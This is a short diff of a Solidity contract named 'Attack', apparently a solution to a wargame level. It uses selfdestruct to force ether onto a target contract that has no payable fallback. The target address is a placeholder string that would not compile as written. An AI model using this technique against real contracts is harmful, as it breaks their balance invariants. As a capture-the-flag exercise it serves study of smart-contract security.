@@ -3,13 +3,13 @@ pragma solidity ^0.8.0;
 
 contract Attack {
 
-    address target_addr = "Instance address";
-    
-    receive() external payable { // allowing this contract to receive ethers.
+    address payable target_addr = payable("Instance address");
 
+    constructor() payable { // send ethers to the contract when deploying it
+        
     }
 
-    function kill() public { // kill the contract and FORCIBLY send ethers to the target even the target doesn't have payable fallback function.
-        selfdestruct(payable(target_addr));
+    function kill() public {
+        selfdestruct(target_addr);
     }
 }
